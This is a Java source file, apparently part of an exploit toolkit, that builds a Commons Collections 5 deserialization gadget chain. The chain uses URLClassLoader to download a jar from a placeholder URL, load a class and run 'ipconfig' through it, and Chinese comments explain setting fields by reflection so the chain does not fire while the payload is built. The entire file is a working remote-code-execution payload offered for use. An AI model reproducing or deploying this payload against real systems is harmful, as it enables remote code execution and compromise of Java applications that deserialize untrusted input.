package com.Jasetol.payloads;

import com.Jasetol.utils.ParseArgs;
import com.Jasetol.utils.Reflect;
import com.Jasetol.utils.SerWithUnSer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.management.BadAttributeValueExpException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
/*
* CommonsCollection05
*
* */
public class echoForUrlClassLoader {
    public static Object getObject() throws Exception{

        // 构造 Transformer[] 数组
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(URLClassLoader.class),
                new InvokerTransformer("getConstructor",new Class[]{Class[].class},new Object[]{new Class[]{URL[].class}}),
                new InvokerTransformer("newInstance",new Class[]{Object[].class},new Object[]{new Object[]{new URL[]{new URL("http://127.0.0.1:80/UrlClassLoaderEcho.jar")}}}),
                new InvokerTransformer("loadClass",new Class[]{String.class},new Object[]{"UrlClassLoaderEcho"}),
                new InvokerTransformer("getConstructor",new Class[]{Class[].class},new Object[]{new Class[]{String.class}}),
                new InvokerTransformer("newInstance",new Class[]{Object[].class},new Object[]{new String[]{"ipconfig"}}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(new HashMap(),"ky0116");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        // 反射对字段进行赋值,防止在构造 payload 的时候触发 Gadget
        Reflect.reflectSetField(tiedMapEntry,"map",lazyMap);
        Reflect.reflectSetField(chainedTransformer,"iTransformers",transformer);
        Reflect.reflectSetField(badAttributeValueExpException,"val",tiedMapEntry);
        return badAttributeValueExpException;
    }

    public static void main(String[] args) throws Exception{
        ParseArgs.parseArgs(args);
        BadAttributeValueExpException badAttributeValueExpException = (BadAttributeValueExpException) getObject();
        byte[] bytes = SerWithUnSer.serialize(badAttributeValueExpException);
        SerWithUnSer.unSerialize(bytes);
    }
}
